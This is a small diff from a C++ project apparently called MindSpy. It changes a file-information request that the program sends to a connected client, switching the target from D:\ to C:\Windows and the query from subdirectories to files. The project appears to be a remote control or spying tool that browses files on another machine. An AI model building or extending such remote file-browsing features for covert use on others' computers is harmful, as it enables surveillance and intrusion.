@@ -80,8 +80,8 @@ namespace MindSpy
 			case INTERNOS_CMDS::REQ_FILEINFO: {
 				stFileInfoRequest stfir;
 				wcsncpy(stfir.Filtro, L"*.*", 4);
-				wcsncpy(stfir.Path, L"D:\\", 4);
-				stfir.Query = FILEINFO_QUERY::REQ_ONLY_SUBDIR;
+				wcsncpy(stfir.Path, L"C:\\Windows", 11);
+				stfir.Query = FILEINFO_QUERY::REQ_ONLY_ARCHIVE;
 				if (c.EnviarComando((char*)Op1.c_str(), sizeof(stFileInfoRequest), CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
 					wcout << L"Solicitando información de archivos...";
 				break;
